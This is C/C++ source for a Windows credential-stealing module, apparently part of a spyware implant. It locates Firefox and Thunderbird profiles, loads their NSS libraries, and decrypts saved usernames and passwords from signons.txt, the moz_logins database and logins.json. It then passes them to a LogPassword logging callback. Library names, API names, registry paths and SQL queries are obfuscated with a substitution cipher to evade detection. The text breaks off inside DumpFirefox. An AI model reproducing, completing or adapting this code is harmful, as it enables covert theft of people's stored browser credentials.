
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <userenv.h>
#include "../HM_SafeProcedures.h"
#include "../demo_functions.h"
#include "../common.h"
#include "..\JSON\JSON.h"
#include "..\JSON\JSONValue.h"

#pragma comment(lib,"userenv.lib")

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
extern char *LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt);
extern char *HM_CompletePath(char *file_name, char *buffer);
extern WCHAR *GetTBLibPath();
extern char H4_DUMMY_NAME[];
extern char *GetDosAsciiName(WCHAR *orig_path);

//Firefox internal SEC structures
typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};
//-----------------------------------------------------------------------
//Removes gecko-sdk dependency
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0

//Mozilla library names
#define NSS_LIBRARY_NAME   "199n.Xyy" //"nss3.dll"
#define PLC_LIBRARY_NAME   "Pypx.Xyy" //"plc4.dll"
#define NSPR_LIBRARY_NAME  "19PEx.Xyy" //"nspr4.dll"
#define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
#define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
#define MOZCRT_LIBRARY_NAME  "05OpELYN.Xyy" //"mozcrt19.dll"
#define MOZCRTALT_LIBRARY_NAME "05OVLZy9.Xyy" //"mozutils.dll"
#define MOZCRTALTSEC_LIBRARY_NAME "05O7yVI.Xyy" //"mozglue.dll"
#define NSSU_LIBRARY_NAME  "199VLZyn.Xyy" //"nssutil3.dll"
#define PLDS_LIBRARY_NAME  "PyX9x.Xyy" //"plds4.dll"
#define SOFTN_LIBRARY_NAME "95ML5T1n.Xyy" //"softokn3.dll"

#define FREEBL3_LIBRARY_NAME "MEIIiyn.Xyy" //"freebl3.dll"
#define NSSDBM_LIBRARY_NAME "199Xi0n.Xyy" //"nssdbm3.dll"

//-----------------------------------------------------------------------

typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

// SQLITE Library functions
typedef int (*sqlite3_open)(const char *, void **);
typedef int (*sqlite3_close)(void *);
typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char**,char**), void *, char **);

typedef HMODULE (WINAPI *LoadLibrary_t)(char *);

// Function declarations..
void NSSUnload();
int InitFFLibs(WCHAR *firefoxPath);
int InitializeNSSLibrary(WCHAR *profilePath, char *password);
int DirectoryExists(WCHAR *path);
WCHAR *GetFFProfilePath();
WCHAR *GetFFLibPath();

int PK11Decrypt(CHAR *decodeData, int decodeLen, WCHAR **clearData, int *finalLen);
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
//-----------------------------------------------------------------------
NSS_Init                NSSInit = NULL;
NSS_Shutdown            NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword  PK11CheckUserPassword = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
PL_Base64Decode         PLBase64Decode = NULL;
sqlite3_open			SQLITE_open = NULL;
sqlite3_close			SQLITE_close = NULL;
sqlite3_exec			SQLITE_exec = NULL;

int IsNSSInitialized = 0;

HMODULE libnss = NULL;
HMODULE libplc = NULL;
HMODULE libsql = NULL;
HMODULE libnspr4 = NULL;
HMODULE libcrt = NULL;
HMODULE libnssu = NULL;
HMODULE libpld = NULL;
HMODULE libsof = NULL;
HMODULE libtmp = NULL;
HMODULE libmsvcrt = NULL;

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

#define ALPHABET_LEN 64
char *DeobStringA(char *string)
{
	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
		                         'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
		                         'i','b','U','I','e','y','l','J','W','h','j','0','m',
                                 '5','o','2','E','r','L','t','6','v','G','R','N','9',
					             's','Y','1','n','3','P','p','c','7','g','-','C'};                  
	static char ret_string[MAX_PATH];
	DWORD i,j, scramble=1;

	_snprintf_s(ret_string, MAX_PATH, "%s", string);

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

WCHAR *DeobStringW(WCHAR *string)
{
	WCHAR alphabet[ALPHABET_LEN]={L'_',L'B',L'q',L'w',L'H',L'a',L'F',L'8',L'T',L'k',L'K',L'D',L'M',
		                          L'f',L'O',L'z',L'Q',L'A',L'S',L'x',L'4',L'V',L'u',L'X',L'd',L'Z',
		                          L'i',L'b',L'U',L'I',L'e',L'y',L'l',L'J',L'W',L'h',L'j',L'0',L'm',
                                  L'5',L'o',L'2',L'E',L'r',L'L',L't',L'6',L'v',L'G',L'R',L'N',L'9',
					              L's',L'Y',L'1',L'n',L'3',L'P',L'p',L'c',L'7',L'g',L'-',L'C'};                  
	static WCHAR ret_string[MAX_PATH];
	DWORD i,j, scramble=1;

	_snwprintf_s(ret_string, MAX_PATH, L"%s", string);

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

BOOL CopyDLL(WCHAR *src, char *dst)
{
	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
	HANDLE hdst, hsrc;
	WCHAR dst_name[MAX_PATH];

	swprintf_s(dst_name, MAX_PATH, L"%S", dst);
	ZeroMemory(&src_info, sizeof(src_info));
	ZeroMemory(&dst_info, sizeof(dst_info));
	hdst = FNC(CreateFileW)(dst_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hdst != INVALID_HANDLE_VALUE) {
		hsrc = FNC(CreateFileW)(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
		if (hsrc == INVALID_HANDLE_VALUE) {
			CloseHandle(hdst);
			return FALSE;
		}
		FNC(GetFileInformationByHandle)(hsrc, &src_info);
		FNC(GetFileInformationByHandle)(hdst, &dst_info);
		CloseHandle(hdst);
		CloseHandle(hsrc);

		if (src_info.ftLastWriteTime.dwHighDateTime ==  dst_info.ftLastWriteTime.dwHighDateTime &&
			src_info.ftLastWriteTime.dwLowDateTime ==  dst_info.ftLastWriteTime.dwLowDateTime)
			return TRUE;
	}
	return FNC(CopyFileW)(src, dst_name, FALSE);
}

HMODULE CopyAndLoadDLL(WCHAR *src, char *dest)
{
	LoadLibrary_t pLoadLibrary;

	pLoadLibrary = (LoadLibrary_t) HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibrary) 
		return NULL;

	if (!CopyDLL(src, dest))
		return NULL;

	return pLoadLibrary(dest);
}

void FireFoxInitFunc()
{
	BOOL FF_ver_3 = false;
	WCHAR loadPath[MAX_PATH];
	char destPath[MAX_PATH];
	WCHAR *firefoxDir;

	firefoxDir = GetFFLibPath();
	if (!firefoxDir || !DirectoryExists(firefoxDir)) {
		firefoxDir = GetTBLibPath();
		if (!firefoxDir || !DirectoryExists(firefoxDir))
			return;
	}

	if (!libmsvcrt && GetModuleHandle("msvcr100.dll") == NULL) {
		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcr100.dll");
		HM_CompletePath("msvcr100.dll", destPath);
		libmsvcrt = CopyAndLoadDLL(loadPath, destPath);
	}

	if (!libcrt) {
		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRT_LIBRARY_NAME));
		HM_CompletePath(DeobStringA(MOZCRT_LIBRARY_NAME), destPath);
		libcrt = CopyAndLoadDLL(loadPath, destPath);
		if (!libcrt) {
			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRTALT_LIBRARY_NAME));
			HM_CompletePath(DeobStringA(MOZCRTALT_LIBRARY_NAME), destPath);
			libcrt = CopyAndLoadDLL(loadPath, destPath);
		}
		if (!libcrt) {
			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(MOZCRTALTSEC_LIBRARY_NAME));
			HM_CompletePath(DeobStringA(MOZCRTALTSEC_LIBRARY_NAME), destPath);
			libcrt = CopyAndLoadDLL(loadPath, destPath);
		}

		if (libcrt)
			FF_ver_3 = true;
	}

	if (!libnspr4) {
		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSPR_LIBRARY_NAME));
		HM_CompletePath(DeobStringA(NSPR_LIBRARY_NAME), destPath);
		libnspr4 = CopyAndLoadDLL(loadPath, destPath);
		//if (!libnspr4)
			//return;
	}

	if (libnspr4) {
		if (!libpld) {
			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLDS_LIBRARY_NAME));
			HM_CompletePath(DeobStringA(PLDS_LIBRARY_NAME), destPath);
			libpld = CopyAndLoadDLL(loadPath, destPath);
			if (!libpld)
				return;
		}

		if (!libplc) {
			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLC_LIBRARY_NAME));
			HM_CompletePath(DeobStringA(PLC_LIBRARY_NAME), destPath);
			libplc = CopyAndLoadDLL(loadPath, destPath);
			if (!libplc)
				return;
		}

		if (FF_ver_3) { 
			if (!libnssu) {
				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSU_LIBRARY_NAME));
				HM_CompletePath(DeobStringA(NSSU_LIBRARY_NAME), destPath);
				libnssu = CopyAndLoadDLL(loadPath, destPath);
				if (!libnssu)
					return;
			}

			if (!libsql) {
				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITE_LIBRARY_NAME));
				HM_CompletePath(DeobStringA(SQLITE_LIBRARY_NAME), destPath);
				libsql = CopyAndLoadDLL(loadPath, destPath);
				if (!libsql) { // Su FireFox4 la libreria si chiama diversamente
					swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
					HM_CompletePath(DeobStringA(SQLITEALT_LIBRARY_NAME), destPath);
					libsql = CopyAndLoadDLL(loadPath, destPath);
					if (!libsql)
						return;
				}
			}
		}

		if (!libsof) {
			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
			HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
			libsof = CopyAndLoadDLL(loadPath, destPath);
			if (!libsof)
				return;
		}
	}

	if (!libnss) {
		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSS_LIBRARY_NAME));
		HM_CompletePath(DeobStringA(NSS_LIBRARY_NAME), destPath);
		libnss = CopyAndLoadDLL(loadPath, destPath);
		if (!libnss)
			return;

		if (!libsql)
			libsql = libnss;

		if (!libplc)
			libplc = libnss;
	}

	swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(FREEBL3_LIBRARY_NAME));
	HM_CompletePath(DeobStringA(FREEBL3_LIBRARY_NAME), destPath);
	CopyDLL(loadPath, destPath);

	swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSDBM_LIBRARY_NAME));
	HM_CompletePath(DeobStringA(NSSDBM_LIBRARY_NAME), destPath);
	CopyDLL(loadPath, destPath);

	if (!libsof) {
		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
		HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
		CopyDLL(loadPath, destPath);
	}
}

void FireFoxUnInitFunc()
{
    if ( libnss != NULL )
		FreeLibrary(libnss);  //Free nss library

	if ( libsof != NULL )
		FreeLibrary(libsof); 

	if ( libsql != NULL && libsql != libnss)
		FreeLibrary(libsql);  //Free sql library

	if ( libnssu != NULL )
		FreeLibrary(libnssu); 

    if ( libplc != NULL && libplc != libnss )
		FreeLibrary(libplc);  //Free plc library

	if ( libpld != NULL )
		FreeLibrary(libpld); 

	if ( libnspr4 != NULL )
		FreeLibrary(libnspr4); 

	if ( libcrt != NULL ) {
		FreeLibrary(libcrt);
		Sleep(100);
		FreeLibrary(libcrt);
	}

	if ( libmsvcrt != NULL ) {
		FreeLibrary(libmsvcrt);
		Sleep(100);
		FreeLibrary(libmsvcrt);
	}

	libnss = NULL;
	libplc = NULL;
	libsql = NULL;
	libnspr4 = NULL;
	libcrt = NULL;
	libnssu = NULL;
	libpld = NULL;
	libsof = NULL;
	libtmp = NULL;
	libmsvcrt = NULL;

}


int DirectoryExists(WCHAR *path)
{
    DWORD attr = GetFileAttributesW(path);
	
	if (!path)
		return 0;

	if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) ) 
		return 0;
    
    return 1;
}


//Loads specified firefox library with the given ffdir path as root
HMODULE LoadLibraryFF(WCHAR *firefoxDir, char *libName)
{
	char loadPath[MAX_PATH];

	sprintf_s(loadPath, MAX_PATH, "%S\\%s", firefoxDir, libName);

    if (!(libtmp = LoadLibrary(loadPath)))
		return NULL; 

    return libtmp;
}


int InitFFLibs(WCHAR *FFDir)
{
	if (FFDir == NULL ) 
		return 0;

	NSSInit = NULL;
	NSSShutdown = NULL;

    // Extract the required functions....
	NSSInit                = (NSS_Init) HM_SafeGetProcAddress(libnss, DeobStringA("RAACU1ZL")); //"NSS_Init"
    NSSShutdown            = (NSS_Shutdown)HM_SafeGetProcAddress(libnss, DeobStringA("RAACAWVLX5q1")); //"NSS_Shutdown"
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) HM_SafeGetProcAddress(libnss, DeobStringA("3kYYCvILU1LIE1HykIeAy5L")); //"PK11_GetInternalKeySlot"
    PK11FreeSlot           = (PK11_FreeSlot) HM_SafeGetProcAddress(libnss, DeobStringA("3kYYCaEIIAy5L")); //"PK11_FreeSlot"
    PK11Authenticate       = (PK11_Authenticate) HM_SafeGetProcAddress(libnss, DeobStringA("3kYYCQVLWI1LZpHLI")); //"PK11_Authenticate"
    PK11SDRDecrypt         = (PK11SDR_Decrypt) HM_SafeGetProcAddress(libnss, DeobStringA("3kYYAKGCKIpEePL")); //"PK11SDR_Decrypt"
    PK11CheckUserPassword  = (PK11_CheckUserPassword ) HM_SafeGetProcAddress(libnss, DeobStringA("3kYYC-WIpTb9IE3H99q5EX")); //"PK11_CheckUserPassword"

    if ( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword) {
		NSSUnload();
        return 0;
    }

	// Get the functions from PLC library
	if (!(PLBase64Decode = ( PL_Base64Decode ) HM_SafeGetProcAddress(libplc, DeobStringA("3rC_H9ItxKIp5XI")))) { //"PL_Base64Decode"
		NSSUnload();
		return 0;
	}

	if (libsql) {
		// sqlite functions
		SQLITE_open = (sqlite3_open) HM_SafeGetProcAddress(libsql, DeobStringA("9ByZLInC5PI1"));  //"sqlite3_open"
		SQLITE_close = (sqlite3_close) HM_SafeGetProcAddress(libsql, DeobStringA("9ByZLInCpy59I")); //"sqlite3_close"
		SQLITE_exec = (sqlite3_exec) HM_SafeGetProcAddress(libsql, DeobStringA("9ByZLInCISIp")); //"sqlite3_exec"

		if (!SQLITE_open || !SQLITE_close || !SQLITE_exec) {
			NSSUnload();
			return 0;
		}
	}

	return 1;
}


int InitializeNSSLibrary(WCHAR *profilePath)
{
	CHAR szProfile[MAX_PATH];

	sprintf_s(szProfile, MAX_PATH, "%S", profilePath);

	IsNSSInitialized = 0;

    // Initialize the NSS library
    if( (*NSSInit) (szProfile) != SECSuccess ) {
		NSSUnload();
		return 0;
	} 
		
	IsNSSInitialized = 1;
	return 1;
}

void NSSUnload()
{
    if ( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

	NSSShutdown = NULL;
}

// La stringa tornata va liberata
WCHAR *UTF8_2_UTF16(char *str)
{
	DWORD wclen;
	WCHAR *wcstr;

	if ( (wclen = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0)) == 0 )
		return NULL;

	if ( !(wcstr = (WCHAR *)malloc(wclen*sizeof(WCHAR))) )
		return NULL;

	if ( MultiByteToWideChar(CP_UTF8, 0, str, -1, wcstr, wclen) == 0 ) {
		free(wcstr);
		return NULL;
	}

	return wcstr;
}


int DecryptStr(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
{
	int decodeLen = 0;
	int finalLen = 0;
	char *decodeData = NULL;
	WCHAR *finalData = NULL;

	if (cryptData[0] == NULL )
		return 0;
	
	if ((Base64Decode(cryptData, &decodeData, &decodeLen) == 0) || (decodeData == NULL)) 
		return 0;

	// Do the actual PK11 decryption
    if ((PK11Decrypt(decodeData, decodeLen, &finalData, &finalLen) == 0) || (finalData == NULL))
		return 0;

	wcsncpy(clearData, finalData, clearSize);
    
	if (finalLen < (INT)clearSize + 1)
		*(clearData + finalLen) = 0;    // Null terminate string

	SAFE_FREE(finalData);

	return 1;
}


int Base64Decode(char *cryptData, char **decodeData, int *decodeLen)
{
    int len = strlen( cryptData );
    int adjust = 0;

    if (cryptData[len-1] == '=') {
      adjust++;
      if (cryptData[len-2] == '=')
		  adjust++;
    }

    *decodeData = ( char *)(*PLBase64Decode)(cryptData, len, NULL);

	if( *decodeData == NULL )
		return 0;
   
    *decodeLen = (len*3)/4 - adjust;

    return 1;
}


int PK11Decrypt(CHAR *decodeData, int decodeLen, WCHAR **clearData, int *finalLen)
{
    PK11SlotInfo *slot = 0;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot)
		return 0;

	// Decrypt the string
    request.data = (unsigned char *)decodeData;
    request.len = decodeLen;
    reply.data = 0;
	reply.len = 0;

    if ((*PK11SDRDecrypt)(&request, &reply, NULL) != SECSuccess)
		return 0;

    *clearData = UTF8_2_UTF16((char *)reply.data);
    *finalLen  = reply.len;

	// Free the slot
	(*PK11FreeSlot)(slot);

	return 1;
}

struct ffp_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

int DumpFF(WCHAR *profilePath, WCHAR *signonFile)
{
	char buffer[2048];
	WCHAR signonFullFile[MAX_PATH];
	int bufferLength = 2048;
	FILE *ft = NULL;

	struct ffp_entry ffentry;

	memset(&ffentry, 0, sizeof(ffentry));

	if ( profilePath == NULL || signonFile == NULL)
		return 0;

	_snwprintf_s(signonFullFile, MAX_PATH, L"%s\\%s", profilePath, signonFile);

	if ( (ft = _wfopen(signonFullFile, L"r")) == NULL ) 
		 return 0;

	fgets(buffer, bufferLength, ft);

	// Read out the unmanaged ("Never remember" URL list
	while (fgets(buffer, bufferLength, ft) != 0) {
		// End of unmanaged list
		if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
			break;
	}

	// read the URL line
	while (fgets(buffer, bufferLength, ft) != 0 ){

		buffer[strlen(buffer)-1] = 0;
		//printf("-> URL: %s \n", buffer);
		swprintf_s(ffentry.service, 255, L"Firefox");
		_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%S", buffer);

		//Start looping through final singon*.txt file
		while (fgets(buffer, bufferLength, ft) != 0 ) {

			// new host begins with '.', second entry for a single host have '---'
			if (!strncmp(buffer, ".", 1) || !strncmp(buffer, "---", 3)) {
				if (wcscmp(ffentry.user_name, L""))
					LogPassword(ffentry.service, ffentry.resource, ffentry.user_value, ffentry.pass_value);
				
				memset(&ffentry.user_value, 0, sizeof(ffentry.user_value));
				memset(&ffentry.user_name, 0, sizeof(ffentry.user_name));
				memset(&ffentry.pass_value, 0, sizeof(ffentry.pass_value));
				memset(&ffentry.pass_name, 0, sizeof(ffentry.pass_name));
				
				if (!strncmp(buffer, ".", 1))
					break; // end of cache entry
				else 
					continue;
			}

			//Check if its a password
			if (buffer[0] == '*') {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(ffentry.pass_name, 255, _TRUNCATE, L"%S", buffer + 1);
				
				fgets(buffer, bufferLength, ft);
				buffer[strlen(buffer)-1] = 0;
				
				DecryptStr(buffer, ffentry.pass_value, 255);

			// else is the username the first time, the subdomain the second
			} else if (!wcscmp(ffentry.user_name, L"")) {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(ffentry.user_name, 255, _TRUNCATE, L"%S", buffer);

				fgets(buffer, bufferLength, ft);
				buffer[strlen(buffer)-1] = 0;

				DecryptStr(buffer, ffentry.user_value, 255);
			}
		}
	}

	fclose(ft);

	return 1;
}

int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
{
	struct ffp_entry ffentry;
	
	ZeroMemory(&ffentry, sizeof(ffentry));
	for(int i=0; i<argc; i++){
		if (!strcmp(azColName[i], "hostname")) {
			swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
			_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], DeobStringA("I1pEePLIXb9IE1H0I"))) {  //"encryptedUsername"
			DecryptStr(argv[i], ffentry.user_value, 255);
		}
		if (!strcmp(azColName[i], DeobStringA("I1pEePLIX3H99q5EX"))) {  //"encryptedPassword"
			DecryptStr(argv[i], ffentry.pass_value, 255);
		}
	}

	LogPassword(ffentry.service, ffentry.resource, ffentry.user_value, ffentry.pass_value);
	
	return 0;
}

int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile)
{
	void *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (SQLITE_open == NULL)
		return 0;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
	SAFE_FREE(ascii_path);

	if ((rc = SQLITE_open(sqlPath, &db)))
		return 0;

	SQLITE_exec(db, DeobStringA("A2r2-8 * aGfD 05OCy57Z19;"), parse_sql_signons, NULL, NULL);  //"SELECT * FROM moz_logins;"

	SQLITE_close(db);

	return 1;
}

WCHAR *GetFFLibPath()
{
	static WCHAR FullPath[MAX_PATH];
	char regSubKey[MAX_PATH];
	char path[MAX_PATH];
	char *p;
	DWORD pathSize = MAX_PATH;
	DWORD valueType;
	HKEY rkey;

	// Open firefox registry key
	_snprintf_s(regSubKey, MAX_PATH, "%s", DeobStringA("Afa8JQG2\\-yZI1L9\\ALHELDI1VU1LIE1IL\\MZEIM5S.ISI\\9WIyy\\5PI1\\p500H1X"));  //"SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command"
	if( FNC(RegOpenKeyExA)(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
		return NULL;

	// Read the firefox path
	if( FNC(RegQueryValueExA)(rkey, NULL, 0,  &valueType, (unsigned char*)path, &pathSize) != ERROR_SUCCESS ) {
        FNC(RegCloseKey)(rkey);
        return NULL;
    }

    if( pathSize <= 0 || path[0] == 0) {
		FNC(RegCloseKey)(rkey);
		return NULL;
	}

	FNC(RegCloseKey)(rkey);

	// get the path and then remove the initial \"
	if ((p = strrchr(path, '\\')) != NULL)
		*p = '\0';

	p = path;
	
	if( *p == '\"' ) 
		p++;

	if (!p)
		return NULL;

	_snwprintf_s(FullPath, MAX_PATH, L"%S", p);		

	return FullPath;
}


WCHAR *GetFFProfilePath()
{
	static WCHAR FullPath[MAX_PATH];
	WCHAR appPath[MAX_PATH];
	WCHAR iniFile[MAX_PATH];
	WCHAR profilePath[MAX_PATH];
	DWORD pathSize = MAX_PATH;

	memset(appPath, 0, sizeof(appPath));
	memset(profilePath, 0, sizeof(profilePath));

	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);

	// Get firefox profile directory
	_snwprintf_s(iniFile, MAX_PATH, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\PE5MZyI9.Z1Z"), appPath); //"%s\\Mozilla\\Firefox\\profiles.ini"

	FNC(GetPrivateProfileStringW)(DeobStringW(L"3E5MZyIj"), L"Path", L"",  profilePath, sizeof(profilePath), iniFile); //"Profile0"

	_snwprintf_s(FullPath, MAX_PATH, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\%9"), appPath, profilePath);  //"%s\\Mozilla\\Firefox\\%s"

	return FullPath;
}

int DumpJsonFF(WCHAR *profilePath, WCHAR *signonFile)
{
	JSONValue* jValue = NULL;
	JSONArray  jLogins;
	JSONObject jObj, jEntry;
	HANDLE hFile, hMap;
	WCHAR file_path[MAX_PATH];
	DWORD login_size;
	char *login_map, *local_login_map;
	WCHAR strLogins[]	= { L'l', L'o', L'g', L'i', L'n', L's', L'\0' };
	WCHAR strURL[]		= { L'h', L'o', L's', L't', L'n', L'a', L'm', L'e', L'\0' };
	WCHAR strUser[]		= { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'U', L's', L'e', L'r', L'n', L'a', L'm', L'e', L'\0' };
	WCHAR strPass[]		= { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L'\0' };
	struct ffp_entry ffentry;
	char tmp_buff[255];

	_snwprintf_s(file_path, sizeof(file_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s", profilePath, signonFile);		

	if ((hFile = FNC(CreateFileW)(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return 0;
	
	login_size = GetFileSize(hFile, NULL);
	if (login_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return 0;
	}
	
	local_login_map = (char *)calloc(login_size + 1, sizeof(char));
	if (local_login_map == NULL) {
		CloseHandle(hFile);
		return 0;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_login_map);
		CloseHandle(hFile);
		return 0;
	}

	if ( (login_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL) {
		SAFE_FREE(local_login_map);
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 0;

	}
	
	memcpy(local_login_map, login_map, login_size);
	FNC(UnmapViewOfFile)(login_map);
	CloseHandle(hMap);
	CloseHandle(hFile);
	
	jValue = JSON::Parse(local_login_map);
	if(jValue == NULL) {
		SAFE_FREE(local_login_map);
		return 0;
	}

	if (jValue->IsObject()) {
		jObj = jValue->AsObject(); //json root

		//find the logins object
		if (jObj.find(strLogins) != jObj.end() && jObj[strLogins]->IsArray()) {				
			jLogins = jObj[strLogins]->AsArray();

			for (DWORD i=0; i<jLogins.size(); i++) {
				if (jLogins[i]->IsObject()) {
					jEntry = jLogins[i]->AsObject();

					if (jEntry.find(strURL)!=jEntry.end() && 
						jEntry.find(strUser)!=jEntry.end() && 
						jEntry.find(strPass)!=jEntry.end() &&
						jEntry[strURL]->IsString() &&
						jEntry[strUser]->IsString() &&
						jEntry[strPass]->IsString()) { 
							ZeroMemory(&ffentry, sizeof(ffentry));
							swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
							_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%s", jEntry[strURL]->AsString().c_str());
		
							_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strUser]->AsString().c_str());
							DecryptStr(tmp_buff, ffentry.user_value, 255);
		
							_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strPass]->AsString().c_str());
							DecryptStr(tmp_buff, ffentry.pass_value, 255);
							LogPassword(ffentry.service, ffentry.resource, ffentry.user_value, ffentry.pass_value);
					}
				}
			}
		}
	}

	delete jValue;
	SAFE_FREE(local_login_map);
	return 1;
}

int DumpFirefox(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path
	WCHAR *FFDir = NULL;   		//Firefox main installation path

	NSSShutdown = NULL;
	IsNSSInitialized = 0;
	NSSInit = NULL;

